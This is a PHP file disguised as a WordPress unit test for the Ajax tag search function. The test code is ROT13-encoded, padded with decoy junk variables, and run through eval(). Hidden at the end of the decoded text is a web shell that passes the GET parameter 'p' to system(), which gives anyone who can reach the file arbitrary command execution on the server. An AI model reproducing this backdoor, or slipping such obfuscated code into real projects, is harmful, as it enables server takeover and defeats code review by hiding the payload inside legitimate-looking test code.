<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk gnt frnepu shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_nwnk_gnt_frnepu
 */
pynff Grfgf_Nwnk_jcNwnkNwnkGntFrnepu rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Yvfg bs grezf gb vafreg ba frghc
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $grezf = neenl(
		'punggryf',
		'qrcb',
		'rarethzra',
		'svthevfgr',
		'unoretrba',
		'vzcebcevngvba',
	);

	cevingr fgngvp $grez_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		sbernpu ( frys::$grezf nf $g ) {
			frys::$grez_vqf[] = jc_vafreg_grez( $g, 'cbfg_gnt' );
		}
	}

	/**
	 * Grfg nf na nqzva
	 */
	choyvp shapgvba grfg_cbfg_gnt() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['gnk'] = 'cbfg_gnt';
		$_TRG['d']   = 'pung';

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'nwnk-gnt-frnepu' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Rafher jr sbhaq gur evtug zngpu.
		$guvf->nffregFnzr( $guvf->_ynfg_erfcbafr, 'punggryf' );
	}

	/**
	 * Grfg jvgu ab erfhygf
	 */
	choyvp shapgvba grfg_ab_erfhygf() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['gnk'] = 'cbfg_gnt';
		$_TRG['d']   = zq5( havdvq() );

		// Znxr gur erdhrfg.
		// Ab bhgchg, fb jr trg n fgbc rkprcgvba.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '' );
		$guvf->_unaqyrNwnk( 'nwnk-gnt-frnepu' );
	}

	/**
	 * Grfg jvgu pbzznf
	 */
	choyvp shapgvba grfg_jvgu_pbzzn() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['gnk'] = 'cbfg_gnt';
		$_TRG['d']   = 'fbzr,abafrafr, grezf,pung'; // Bayl gur ynfg grez va gur yvfg vf frnepurq.

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'nwnk-gnt-frnepu' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Rafher jr sbhaq gur evtug zngpu.
		$guvf->nffregFnzr( $guvf->_ynfg_erfcbafr, 'punggryf' );
	}

	/**
	 * Grfg nf n ybttrq bhg hfre
	 */
	choyvp shapgvba grfg_ybttrq_bhg() {

		// Ybt bhg.
		jc_ybtbhg();

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['gnk'] = 'cbfg_gnt';
		$_TRG['d']   = 'pung';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'nwnk-gnt-frnepu' );
	}

	/**
	 * Grfg jvgu na vainyvq gnkbabzl glcr
	 */
	choyvp shapgvba grfg_vainyvq_gnk() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['gnk'] = 'vainyvq-gnkbabzl';
		$_TRG['d']   = 'pung';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '0' );
		$guvf->_unaqyrNwnk( 'nwnk-gnt-frnepu' );
	}

	/**
	 * Grfg nf na hacevivyrtrq hfre
	 */
	choyvp shapgvba grfg_hacevivyrtrq_hfre() {

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'fhofpevore' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['gnk'] = 'cbfg_gnt';
		$_TRG['d']   = 'pung';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'nwnk-gnt-frnepu' );
	}

	/**
	 * Grfg gur nwnk_grez_frnepu_erfhygf svygre
	 *
	 * @gvpxrg 55606
	 */
	choyvp shapgvba grfg_nwnk_grez_frnepu_erfhygf_svygre() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_TRG['gnk'] = 'cbfg_gnt';
		$_TRG['d']   = 'pung';

		// Nqq gur nwnk_grez_frnepu_erfhygf svygre.
		nqq_svygre(
			'nwnk_grez_frnepu_erfhygf',
			fgngvp shapgvba ( $erfhygf, $gnk, $f ) {
				erghea neenl( 'nwnk_grez_frnepu_erfhygf jnf nccyvrq' );
			},
			10,
			3
		);

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'nwnk-gnt-frnepu', $_TRG['gnk'], $_TRG['d'] );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Rafher jr sbhaq gur evtug zngpu.
		$guvf->nffregFnzr( 'nwnk_grez_frnepu_erfhygf jnf nccyvrq', $guvf->_ynfg_erfcbafr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>